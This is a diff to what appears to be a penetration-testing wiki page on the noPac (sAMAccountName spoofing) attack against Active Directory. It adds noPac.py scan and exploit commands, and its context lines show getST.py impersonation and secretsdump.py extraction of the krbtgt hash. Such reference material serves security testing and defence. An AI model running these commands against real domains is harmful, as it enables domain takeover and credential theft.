@@ -72,6 +72,13 @@ KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -
 KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
 ```
 
+[noPac.py](https://github.com/Ridter/noPac) (Python) is an automated alternative that can be used to scan and abuse unpatched targets from a UNIX environnment.
+
+```bash
+scanner.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP
+noPac.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -dump
+```
+
 {% hint style="success" %}
 When using [Impacket](https://github.com/SecureAuthCorp/impacket)'s addcomputer script for the creation of a computer account, the "SAMR" method is used by default (instead of the LDAPS one). At the time of writing (10th of December, 2021), the SAMR method creates the account without SPNs, which allows to skip step #1.
 {% endhint %}
